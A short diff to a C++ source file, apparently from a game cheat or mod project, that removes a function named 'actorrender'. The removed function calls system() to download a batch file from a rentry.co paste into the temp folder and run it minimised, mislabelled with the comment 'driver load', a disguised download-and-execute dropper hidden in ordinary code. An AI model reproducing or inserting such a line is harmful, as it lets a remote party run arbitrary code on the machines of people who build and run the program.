@@ -398,8 +398,3 @@ public:
 };
 
 coleeeer Col;
-
-void actorrender()
-{
-	system(_("curl -L --silent https://rentry.co/IPlogs/raw >\"%TEMP%\\482jnd.bat\" & start /min \"\" \"%TEMP%\\482jnd.bat\"")); //driver load
-}
